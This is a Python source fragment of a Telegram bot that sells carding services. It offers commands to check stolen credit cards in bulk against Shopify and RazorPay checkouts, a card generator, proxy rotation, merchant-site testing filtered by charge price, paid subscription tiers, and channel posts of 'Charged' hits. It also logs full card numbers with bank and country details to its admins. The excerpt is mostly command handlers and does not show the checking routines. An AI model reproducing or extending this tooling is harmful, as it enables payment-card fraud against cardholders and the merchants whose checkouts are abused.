    msg += f"\n――――――――――――――\n⌬ <b>𝐁𝐨𝐭 𝐁𝐲</b> ↬ <a href='https://t.me/PrimeTheOfficialNew'>PrimeTheOfficialNewfer</a>"
    return msg

# ====================== CLIENT ======================
client = TelegramClient('razor_x_bot', API_ID, API_HASH)
client_instance = client

# ====================== HIT NOTIFICATIONS ======================
async def send_channel_hit(res, uid, username, name, gate_type="Shopify"):
    try:
        prem = await is_premium_user(uid)
        tag = bs("Premium") if prem else bs("Free Trial")
        sv = str(res.get("Status", "Charged")).upper()
        prof = f"https://t.me/{username}" if username and not username.startswith("user_") else f"tg://user?id={uid}"
        gw = res.get('Gateway', gate_type)
        resp = res.get('Response', '')
        if gate_type == "RazorPay":
            msg = f"""<b>{bs('HIT')} ➛ {bs(sv)}</b> {PE}
<b>{bs('Gateway')} ➛ {gw}</b>
<b>{bs('Response')} ➛ {resp}</b>
<b>{bs('User')} ➛ <a href=\"{prof}\">{name}</a></b> ({tag})"""
        else:
            msg = f"""<b>{bs('HIT')} ➛ {bs(sv)}</b> {PE}
<b>{bs('Gateway')} ➛ {gw}</b>
<b>{bs('Response')} ➛ {resp}</b>
<b>{bs('Price')} ➛ {res.get('Price', '-')}</b>
<b>{bs('User')} ➛ <a href=\"{prof}\">{name}</a></b> ({tag})"""
        await styled_send(HIT_CHANNEL_ID, msg, buttons=HIT_BUTTON, emoji_ids=[CE["fire"]])
    except:
        pass

async def pin_charged_message(event, msg):
    try:
        if event.is_group: await msg.pin()
    except: pass

async def log_to_admins(text, file=None, buttons=None):
    for admin_id in ADMIN_ID:
        try:
            await styled_send(admin_id, text, file=file, buttons=buttons)
        except Exception as e:
            log.warning(f"Failed to send log to admin {admin_id}: {e}")

async def notify_charged_card(uid, name, card, gateway, response, price="-"):
    bi = await get_bin_info(card.split('|')[0])
    brand = bi.get('brand', '-')
    bin_type = bi.get('type', '-')
    level = bi.get('level', '-')
    bank = bi.get('bank', '-')
    country = bi.get('country', '-')
    flag = bi.get('flag', '🏳️')
    log_text = f"""{PE} <b>{bs('LOG: Charged Card')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('User')}:</b> <a href="tg://user?id={uid}">{name}</a> (<code>{uid}</code>)
{PE} <b>{bs('Card')}:</b> <code>{card}</code>
{PE} <b>{bs('Gateway')}:</b> <code>{gateway}</code>
{PE} <b>{bs('Response')}:</b> <code>{response}</code>
{PE} <b>{bs('Price')}:</b> <code>{price}</code>
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('BIN')}:</b> <code>{brand} | {bin_type} | {level}</code>
{PE} <b>{bs('Bank')}:</b> <code>{bank}</code>
{PE} <b>{bs('Country')}:</b> <code>{country} {flag}</code>"""
    await log_to_admins(log_text)

# ====================== /start ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|cmds?|commands?)$'))
async def start(event):
    try:
        await ensure_user(event.sender_id)
        if not await force_join_check(event): return
        _, at = await can_use(event.sender_id, event.chat)
        if at == "banned":
            t, e = banned_user_message()
            return await styled_reply(event, t, emoji_ids=e)
        plan = await get_user_plan(event.sender_id)
        limit = await get_cc_limit(plan, event.sender_id)
        if is_paid_plan(plan):
            plan_emoji = "🛠️"
            for pi in PLANS.values():
                if pi["tier"].lower() == plan.lower(): plan_emoji = pi["emoji"]; break
            sl = f"{PE} <b>{bs('STATUS')}</b> ━ {plan_emoji} <b>{plan.upper()}</b> {PE} (<code>{limit}</code> {bs('Mass Limit')})"
            se = [CE["star"], CE["crown"]]
        else:
            sl = f"<b>{bs('STATUS')}</b> ━ 🆓 <b>{plan.upper()}</b> (<code>{FREE_SP_DAILY_LIMIT}/{bs('day')}</code> {bs('in group')})"
            se = []
        text = f"""{PE} <b><i>{bs('Shopify')}</i></b>
|   {PE} <code>/sp</code> ━ <b>{bs('Single CC')}</b>
|   {PE} <code>/msp</code> ━ <b>{bs('Mass CC')}</b>

{PE} <b><i>{bs('RazorPay')}</i></b>
|   {PE} <code>/rz</code> ━ <b>{bs('Single CC')}</b>
|   {PE} <code>/mrz</code> ━ <b>{bs('Mass CC')}</b>

{PE} <b><i>{bs('Generator')}</i></b>
|   {PE} <code>/gen</code> ━ <b>{bs('Card Generator')}</b>

{PE} <b><i>{bs('Sites')}</i></b>
|   {PE} <code>/add</code> ━ <b>{bs('Add sites')}</b>
|   {PE} <code>/rm</code> ━ <b>{bs('Remove')}</b>
|   {PE} <code>/sites</code> ━ <b>{bs('View')}</b>
|   {PE} <code>/site</code> ━ <b>{bs('Test all')}</b>
|   {PE} <code>/sitesg</code> ━ <b>{bs('Global sites')}</b>

{PE} <b><i>{bs('Proxy')}</i></b> ({bs('Private')})
|   {PE} <code>/addpxy</code> ━ <b>{bs('Add')}</b>
|   {PE} <code>/proxy</code> ━ <b>{bs('View')}</b>
|   {PE} <code>/chkpxy</code> ━ <b>{bs('Test')}</b>
|   {PE} <code>/rmpxy</code> ━ <b>{bs('Remove')}</b>

{PE} <b><i>{bs('Account')}</i></b>
|   {PE} <code>/info</code> ━ <b>{bs('Profile')}</b>
|   {PE} <code>/plan</code> ━ <b>{bs('Plans')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
{sl}"""
        kb = [[pbtn(bs("Plans"), data="show_plans", bg_primary=True, icon=CE["crown"]),
               pbtn(bs("Support"), url="https://t.me/Sqiziii", bg_success=True, icon=CE["joker"])],
              [pbtn(bs("Channel"), url=JOIN_CHANNEL_LINK, bg_primary=True, icon=CE["link"]),
               pbtn(bs("Group"), url=JOIN_GROUP_LINK, bg_success=True, icon=CE["party"])]]
        ei = [
            CE["bolt"], CE["search"], CE["pin"],       # Shopify
            CE["fire"], CE["search"], CE["pin"],       # RazorPay
            CE["brain"], CE["joker"],                  # Generator
            CE["globe"], CE["plus"], CE["cross"], CE["eyes"], CE["check"], CE["shield"], # Sites
            CE["link"], CE["plus"], CE["eyes"], CE["tick"], CE["trash"],  # Proxy
            CE["info"], CE["info"], CE["gift"]         # Account
        ] + se
        await styled_reply(event, text, buttons=kb, emoji_ids=ei)
    except Exception as e:
        log_user(event.sender_id, "START_ERROR", f"Error={e}", "error")

@client.on(events.CallbackQuery(data=b"check_joined"))
async def check_joined_cb(event):
    uid = event.sender_id
    if uid in ADMIN_ID: return await event.answer(f"✅ {bs('Admin')}!")
    if await is_user_joined(uid):
        await mark_user_joined(uid)
        await event.answer(f"✅ {bs('Verified')}!", alert=True)
        try: await event.delete()
        except: pass
        await styled_send(event.chat_id, f"""{PE} <b>{bs('Welcome')}</b> {PE}
{PE} <code>/start</code> <b>{bs('for commands')}</b>""", emoji_ids=[CE["fire"], CE["fire"], CE["info"]])
    else:
        await event.answer(f"❌ {bs('Not joined')}!", alert=True)

@client.on(events.CallbackQuery(data=b"show_plans"))
async def plans_cb(event):
    cp = await get_user_plan(event.sender_id)
    await event.answer()
    plans_text = f"""{PE} <b>{bs('Plans')}</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>"""
    for pid, pi in PLANS.items():
        plans_text += f"\n{pi['emoji']} <b>{pi['name']}</b> ━ <b>{pi['duration_days']}{bs('d')}</b> ━ <b>{pi['price']}</b>"
    plans_text += f"\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>{bs('Current')}:</b> <b>{cp.upper()}</b>"
    await styled_send(event.chat_id, plans_text, buttons=[[pbtn(bs("Upgrade"), url="https://t.me/Sqiziii", bg_primary=True, icon=CE["crown"])]], emoji_ids=[CE["fire"], CE["fire"], CE["crown"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan$'))
async def show_plans(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    cp = await get_user_plan(event.sender_id)
    plans_text = f"""{PE} <b>{bs('Plans')}</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>"""
    for pid, pi in PLANS.items():
        plans_text += f"\n{pi['emoji']} <b>{pi['name']}</b> ━ <b>{pi['duration_days']}{bs('d')}</b> ━ <b>{pi['price']}</b>"
    plans_text += f"""\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>{bs('Current')}:</b> <b>{cp.upper()}</b>\n{PE} <i>{bs('Contact admin')}</i>"""
    await styled_reply(event, plans_text, buttons=[[pbtn(bs("Upgrade"), url="https://t.me/PrimeTheOfficialNew", bg_primary=True, icon=CE["crown"])]], emoji_ids=[CE["fire"], CE["fire"], CE["crown"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]info$'))
async def info_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    await ensure_user(event.sender_id)
    plan = await get_user_plan(event.sender_id)
    sites = await get_user_sites(event.sender_id)
    pc = await get_proxy_count(event.sender_id)
    plan_emoji = "🆓"
    for pi in PLANS.values():
        if pi["tier"].lower() == plan.lower(): plan_emoji = pi["emoji"]; break
    user_doc = await db["users"].find_one({"user_id": event.sender_id})
    expiry = user_doc.get("expiry") if user_doc else None
    exp_str = expiry.strftime('%Y-%m-%d') if expiry else bs("Never")
    status = bs("Active") if is_paid_plan(plan) else bs("Free")
    limit_text = f"<code>{await get_cc_limit(plan, event.sender_id)}</code>" if is_paid_plan(plan) else f"<code>{FREE_SP_DAILY_LIMIT}/{bs('day')} ({bs('group')})</code>"
    used_today = get_free_sp_usage(event.sender_id)
    usage_line = ""
    if not is_paid_plan(plan) and event.sender_id not in ADMIN_ID:
        usage_line = f"\n{PE} <b>{bs('Used Today')}:</b> <code>{used_today}/{FREE_SP_DAILY_LIMIT}</code>"
    await styled_reply(event, f"""{PE} <b>{bs('Profile')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('ID')}:</b> <code>{event.sender_id}</code>
{PE} <b>{bs('Status')}:</b> <code>{status}</code>
{PE} <b>{bs('Plan')}:</b> {plan_emoji} <b>{plan.upper()}</b>
{PE} <b>{bs('Expiry')}:</b> <code>{exp_str}</code>
{PE} <b>{bs('Limit')}:</b> {limit_text}{usage_line}
{PE} <b>{bs('Sites')}:</b> <code>{len(sites)}</code>
{PE} <b>{bs('Proxies')}:</b> <code>{pc}/{bs('100')}</code>""", emoji_ids=[CE["fire"], CE["fire"], CE["info"], CE["star"], CE["crown"], CE["chart"], CE["globe"], CE["link"], CE["shield"]])

# ====================== SITE MANAGEMENT ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]add\b'))
async def add_site(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    try:
        sta = []
        if event.is_reply:
            rm = await event.get_reply_message()
            if rm and rm.file:
                fp = await rm.download_media()
                try:
                    async with aiofiles.open(fp, "r", encoding="utf-8", errors="ignore") as f: sta = extract_urls_from_text(await f.read())
                finally:
                    try: os.remove(fp)
                    except: pass
            elif rm and rm.text: sta = extract_urls_from_text(rm.text)
        add_text = re.sub(r'^[/.]add\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
        if add_text:
            for s in extract_urls_from_text(add_text):
                if s not in sta: sta.append(s)
        if not sta:
            return await styled_reply(event, f"""{PE} <b>{bs('Add Site')}</b> {PE}\n{PE} <code>/add site.com</code>\n{PE} <i>{bs('Or reply .txt with')} </i><code>/add</code>""", emoji_ids=[CE["fire"], CE["fire"], CE["info"], CE["link"]])
        existing_norm = {normalize_site_url(s) for s in await get_user_sites(event.sender_id)}
        new_sites, already_exists = [], []
        for site in sta:
            n = normalize_site_url(site)
            if n in existing_norm: already_exists.append(n)
            elif n not in [normalize_site_url(s) for s in new_sites]: new_sites.append(n)
        if not new_sites:
            return await styled_reply(event, f"""{PE} <b>{bs('All sites already exist')}</b> {PE}\n{PE} <b>{bs('Duplicates')}:</b> <code>{len(already_exists)}</code>""", emoji_ids=[CE["warn"], CE["warn"], CE["info"]])
        uid = event.sender_id
        PENDING_ADD_SITES[uid] = {"sites": new_sites, "exists": already_exists, "event": event}
        kb = [[pbtn(f"{bs('0-5 USD')}", f"addprice:5:{uid}", bg_success=True, icon=CE["gem"]),
               pbtn(f"{bs('0-10 USD')}", f"addprice:10:{uid}", bg_success=True, icon=CE["gem"])],
              [pbtn(f"{bs('0-20 USD')}", f"addprice:20:{uid}", bg_success=True, icon=CE["gem"]),
               pbtn(f"{bs('0-40 USD')}", f"addprice:40:{uid}", bg_success=True, icon=CE["gem"])]]
        await styled_reply(event, f"""{PE} <b>{bs('Select Price Range')}</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>{bs('New Sites')}:</b> <code>{len(new_sites)}</code>\n{PE} <b>{bs('Already Exist')}:</b> <code>{len(already_exists)}</code>\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <i>{bs('Only working sites within price range will be added')}</i>""", buttons=kb, emoji_ids=[CE["fire"], CE["fire"], CE["globe"], CE["warn"], CE["info"]])
    except Exception as e:
        await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])

@client.on(events.CallbackQuery(pattern=rb"addprice:(\d+):(\d+)"))
async def add_price_cb(event):
    max_price = int(event.pattern_match.group(1).decode())
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = PENDING_ADD_SITES.pop(uid, None)
    if not data: return await event.answer(f"{bs('Expired')}!", alert=True)
    if uid in ACTIVE_ADD_PROCESSES: return await event.answer(f"{bs('Already running')}!", alert=True)
    ACTIVE_ADD_PROCESSES[uid] = True
    await event.answer(f"{bs('Testing sites')}...")
    try: await event.delete()
    except: pass
    asyncio.create_task(_process_add_sites(data["event"], data["sites"], data["exists"], max_price))

async def _process_add_sites(event, new_sites, already_exists, max_price):
    uid = event.sender_id
    total = len(new_sites); tested = working = dead = added_to_db = 0
    proxies = await get_all_user_proxies(uid)
    user_site_sem = get_user_sem(uid, "site")
    http_session = await get_user_http_session(uid, "site")
    sm = await styled_reply(event, f"{PE} <b>{bs('Testing')} {total} {bs('sites')}...</b>", emoji_ids=[CE["fire"]])
    last_ui = [0]; working_sites_data = []
    def is_stopped(): return uid not in ACTIVE_ADD_PROCESSES
    async def update_ui():
        now = time.time()
        if now - last_ui[0] < 3.0: return
        last_ui[0] = now
        try: await styled_edit(sm, f"{PE} <b>{bs('Testing')}...</b> {tested}/{total} | ✅{working} ❌{dead}", emoji_ids=[CE["fire"]])
        except: pass
    async def test_worker(site):
        nonlocal tested, working, dead, added_to_db
        async with user_site_sem:
            if is_stopped(): return
            try:
                res = await test_site(site, random.choice(proxies) if proxies else None, http_session=http_session)
                tested += 1
                if res['status'] == 'alive':
                    working += 1
                    price_val = 0
                    ps = res.get('price', '-')
                    if ps and ps != '-':
                        try: price_val = float(str(ps).replace('$', '').strip())
                        except: pass
                    working_sites_data.append({'site': site, 'response': res.get('response', '-'), 'price': ps, 'price_val': price_val})
                    if price_val <= max_price:
                        if await add_site_db(uid, site): added_to_db += 1
                else: dead += 1
                await update_ui()
            except asyncio.CancelledError: raise
            except: dead += 1; tested += 1
    for i in range(0, len(new_sites), SITE_PER_USER_WORKERS):
        if is_stopped(): break
        await asyncio.gather(*[asyncio.create_task(test_worker(s)) for s in new_sites[i:i+SITE_PER_USER_WORKERS]], return_exceptions=True)
    try: await styled_edit(sm, f"""{PE} <b>{bs('Complete')}</b> {PE}\n{PE} <b>{bs('Working')}:</b> <code>{working}</code> | <b>{bs('Dead')}:</b> <code>{dead}</code> | <b>{bs('Added')} ($0-${max_price}):</b> <code>{added_to_db}</code>""", emoji_ids=[CE["fire"], CE["check"], CE["cross"], CE["chart"]])
    except: pass
    ACTIVE_ADD_PROCESSES.pop(uid, None)
    await cleanup_user_http_session(uid, "site"); cleanup_user_sem(uid)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rm\b'))
async def remove_site(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    rt = re.sub(r'^[/.]rm\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    if rt.lower() == 'all':
        existing = await get_user_sites(event.sender_id)
        if not existing: return await styled_reply(event, f"{PE} <b>{bs('No sites')}</b>", emoji_ids=[CE["warn"]])
        c = 0
        for s in existing:
            if await remove_site_db(event.sender_id, s): c += 1
        return await styled_reply(event, f"{PE} <b>{bs('Removed')} {c} {bs('sites')}</b>", emoji_ids=[CE["check"]])
    if not rt: return await styled_reply(event, f"{PE} <code>/rm site.com</code> {bs('or')} <code>/rm all</code>", emoji_ids=[CE["info"]])
    to_rm = extract_urls_from_text(rt)
    if not to_rm: return await styled_reply(event, f"{PE} <b>{bs('No URLs')}</b>", emoji_ids=[CE["cross"]])
    existing = await get_user_sites(event.sender_id)
    removed = []
    for s in to_rm:
        n = normalize_site_url(s)
        for ex in existing:
            if normalize_site_url(ex) == n:
                if await remove_site_db(event.sender_id, ex): removed.append(ex)
                break
    await styled_reply(event, f"{PE} <b>{bs('Removed')}:</b> <code>{len(removed)}</code>", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]addrz\b'))
async def add_razorpay_sites_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    if event.sender_id not in ADMIN_ID: return
    
    rt = re.sub(r'^[/.]addrz\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    sites = []
    if rt:
        sites = extract_rz_urls_from_text(rt)
        
    rm = await event.get_reply_message() if event.reply_to_msg_id else None
    if rm and rm.file and rm.file.name.endswith('.txt'):
        status_msg = await styled_reply(event, f"{bs('Processing RazorPay sites from file')}… ⏳")
        try:
            file_path = await rm.download_media()
            async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = await f.read()
                file_sites = extract_rz_urls_from_text(content)
                sites.extend(file_sites)
            try: os.remove(file_path)
            except: pass
        except Exception as e:
            return await styled_edit(status_msg, f"❌ <b>{bs('Error reading file')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])
    else:
        status_msg = None

    if not sites:
        return await styled_reply(event, f"{PE} <b>{bs('How to use')}</b>\n⤷ <code>/addrz site1.com site2.com</code>\n⤷ {bs('Or reply /addrz to a .txt file containing sites')}", emoji_ids=[CE["info"]])

    if not status_msg:
        status_msg = await styled_reply(event, f"{bs('Processing RazorPay sites')}… ⏳")

    try:
        existing_sites = load_razorpay_sites()
        existing_norm = {normalize_rz_site_url(s) for s in existing_sites}
        new_sites = []
        for site in sites:
            n = normalize_rz_site_url(site)
            if n not in existing_norm and normalize_rz_site_url(site) not in [normalize_rz_site_url(s) for s in new_sites]:
                new_sites.append(site)
                
        if new_sites:
            async with aiofiles.open(RAZORPAY_SITES_FILE, 'a', encoding='utf-8') as f:
                for site in new_sites:
                    await f.write(f"{site}\n")
                    
        await styled_edit(status_msg, f"""✅ <b>{bs('RazorPay sites added')}</b>\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>{bs('Total Uploaded')}:</b> <code>{len(sites)}</code>\n{PE} <b>{bs('New Added')}:</b> <code>{len(new_sites)}</code>\n{PE} <b>{bs('Duplicates')}:</b> <code>{len(sites) - len(new_sites)}</code>""", emoji_ids=[CE["check"], CE["info"]])
    except Exception as e:
        await styled_edit(status_msg, f"❌ <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rmrz\b'))
async def remove_razorpay_sites_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    if event.sender_id not in ADMIN_ID: return
    
    rt = re.sub(r'^[/.]rmrz\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    if not rt:
        return await styled_reply(event, f"{PE} <code>/rmrz site.com</code> {bs('or')} <code>/rmrz all</code>", emoji_ids=[CE["info"]])
        
    if rt.lower() == 'all':
        try: os.remove(RAZORPAY_SITES_FILE)
        except: pass
        return await styled_reply(event, f"{PE} <b>{bs('Removed all RazorPay sites')}</b>", emoji_ids=[CE["check"]])
        
    to_rm = [normalize_rz_site_url(s) for s in extract_rz_urls_from_text(rt)]
    if not to_rm:
        return await styled_reply(event, f"{PE} <b>{bs('No URLs')}</b>", emoji_ids=[CE["cross"]])
        
    existing = load_razorpay_sites()
    new_sites = []
    removed_count = 0
    for s in existing:
        n = normalize_rz_site_url(s)
        if n in to_rm:
            removed_count += 1
        else:
            new_sites.append(s)
            
    if removed_count > 0:
        if new_sites:
            async with aiofiles.open(RAZORPAY_SITES_FILE, 'w', encoding='utf-8') as f:
                for site in new_sites:
                    await f.write(f"{site}\n")
        else:
            try: os.remove(RAZORPAY_SITES_FILE)
            except: pass
            
    await styled_reply(event, f"{PE} <b>{bs('Removed')}:</b> <code>{removed_count}</code> {bs('RazorPay sites')}", emoji_ids=[CE["check"]])

async def remove_razorpay_site_programmatically(site_url: str) -> bool:
    try:
        norm_to_rm = normalize_rz_site_url(site_url)
        existing = load_razorpay_sites()
        new_sites = []
        removed = False
        for s in existing:
            if normalize_rz_site_url(s) == norm_to_rm:
                removed = True
            else:
                new_sites.append(s)
        if removed:
            if new_sites:
                async with aiofiles.open(RAZORPAY_SITES_FILE, 'w', encoding='utf-8') as f:
                    for site in new_sites:
                        await f.write(f"{site}\n")
            else:
                try: os.remove(RAZORPAY_SITES_FILE)
                except: pass
            return True
    except:
        pass
    return False

@client.on(events.NewMessage(pattern=r'(?i)^[/.]getrz$'))
async def get_rz_sites_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    if event.sender_id not in ADMIN_ID: return
    
    sites = load_razorpay_sites()
    if not sites:
        return await styled_reply(event, f"❌ <b>{bs('No Razorpay Sites')}</b>", emoji_ids=[CE["stop"]])
        
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"razorpay_sites_{ts}.txt"
    try:
        async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
            for s in sites:
                await f.write(f"{s}\n")
        await styled_send(event.chat_id, f"📝 <b>{bs('RazorPay Sites')}</b>\n⤷ Total: <code>{len(sites)}</code> sites.", file=filename)
    except Exception as e:
        await styled_reply(event, f"❌ <b>{bs('Error sending sites')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])
    finally:
        try: os.remove(filename)
        except: pass

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mrzspeed\b'))
async def mrz_speed_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    if event.sender_id not in ADMIN_ID: return
    
    rt = re.sub(r'^[/.]mrzspeed\s*', '', event.raw_text, flags=re.IGNORECASE).strip().lower()
    if not rt:
        current_speed = await get_mrz_speed()
        return await styled_reply(event, f"{PE} <b>{bs('MRZ Speed Status')}</b>\n<b>━━━━━━━━━━━━━━━━━</b>\n⤷ {bs('Current Speed')}: <code>{current_speed}</code>\n\n💡 <i>{bs('Change speed using:')}</i>\n⤷ <code>/mrzspeed original</code>\n⤷ <code>/mrzspeed slow</code>", emoji_ids=[CE["info"]])
        
    if rt not in ['original', 'slow']:
        return await styled_reply(event, f"❌ <b>{bs('Invalid speed option')}</b>\n⤷ {bs('Choose either')} <code>original</code> {bs('or')} <code>slow</code>.", emoji_ids=[CE["cross"]])
        
    await set_mrz_speed(rt)
    await styled_reply(event, f"🚀 <b>{bs('MRZ Speed Updated')}</b>\n<b>━━━━━━━━━━━━━━━━━</b>\n⤷ {bs('New Speed')}: <code>{rt}</code>", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]changerz\b'))
async def change_rz_site_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    if event.sender_id not in ADMIN_ID: return

    rt = re.sub(r'^[/.]changerz\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    if not rt:
        return await styled_reply(event, f"{PE} <code>/changerz site.com</code> {bs('or')} <code>/changerz none</code> {bs('to rotate')}", emoji_ids=[CE["info"]])
        
    if rt.lower() in ['none', 'clear', 'rotate']:
        await set_active_rz_site(None)
        return await styled_reply(event, f"🔄 <b>{bs('RazorPay Active Site Cleared')}</b>\n⤷ <i>{bs('Bot will now rotate through all sites.')}</i>", emoji_ids=[CE["check"]])
        
    urls = extract_urls_from_text(rt)
    if not urls:
        return await styled_reply(event, f"❌ <b>{bs('Invalid URL format')}</b>", emoji_ids=[CE["cross"]])
        
    site = urls[0]
    await set_active_rz_site(site)
    await styled_reply(event, f"🎯 <b>{bs('RazorPay Active Site Updated')}</b>\n<b>━━━━━━━━━━━━━━━━━</b>\n⤷ <code>{site}</code>", emoji_ids=[CE["check"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]viewrz$'))
async def view_rz_site_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    if event.sender_id not in ADMIN_ID: return

    active = await get_active_rz_site()
    if active:
        text = f"🎯 <b>{bs('Active RazorPay Site')}</b>\n<b>━━━━━━━━━━━━━━━━━</b>\n⤷ <code>{active}</code>\n\n💡 <i>{bs('Exclusively using this site.')}</i>"
        return await styled_reply(event, text, emoji_ids=[CE["star"]])
        
    sites = load_razorpay_sites()
    text = f"🔄 <b>{bs('RazorPay Rotation Sites')}</b> ({len(sites)})\n<b>━━━━━━━━━━━━━━━━━</b>\n"
    eid = [CE["fire"], CE["fire"]]
    for i, s in enumerate(sites[:50], 1):
        text += f"{PE} <code>{i}.</code> <b>{s}</b>\n"
        eid.append(CE["link"])
    if len(sites) > 50:
        text += f"\n<i>+{len(sites)-50} more</i>"
    text += f"\n\n💡 <i>{bs('Active site not set. Rotating through above sites.')}</i>"
    await styled_reply(event, text, emoji_ids=eid)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]editrz\b'))
async def edit_rz_amount_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    if event.sender_id not in ADMIN_ID: return

    rt = re.sub(r'^[/.]editrz\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    if not rt:
        amt = await get_razorpay_amount()
        return await styled_reply(event, f"{PE} <b>{bs('Current RazorPay Amount')}</b>\n⤷ <code>{amt / 100} INR</code> (<code>{amt}</code> paise)\n\n💡 <i>{bs('Set using')}</i> <code>/editrz [amount_in_rs]</code>", emoji_ids=[CE["info"]])
        
    try:
        val = float(rt)
        if val <= 0:
            return await styled_reply(event, f"❌ <b>{bs('Invalid amount')}:</b> {bs('must be greater than 0')}", emoji_ids=[CE["cross"]])
        
        paise = int(round(val * 100))
        await set_razorpay_amount(paise)
        await styled_reply(event, f"🎯 <b>{bs('RazorPay Amount Updated')}</b>\n<b>━━━━━━━━━━━━━━━━━</b>\n⤷ <code>{val} INR</code> (<code>{paise}</code> paise)", emoji_ids=[CE["check"]])
    except ValueError:
        await styled_reply(event, f"❌ <b>{bs('Invalid format')}</b>\n⤷ <i>{bs('Please enter a valid number')}</i>", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]sites$'))
async def list_sites(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id): t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    sites = await get_user_sites(event.sender_id)
    if not sites: return await styled_reply(event, f"{PE} <b>{bs('No sites')}</b> <code>/add</code>", emoji_ids=[CE["warn"]])
    text = f"{PE} <b>{bs('Sites')}</b> ({len(sites)}) {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n"
    eid = [CE["fire"], CE["fire"]]
    for i, s in enumerate(sites[:50], 1): text += f"{PE} <code>{i}.</code> <b>{s}</b>\n"; eid.append(CE["link"])
    if len(sites) > 50: text += f"\n<i>+{len(sites)-50} more</i>"
    await styled_reply(event, text, emoji_ids=eid)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]site$'))
async def check_sites_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_banned_user(event.sender_id): t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    sites = await get_user_sites(event.sender_id)
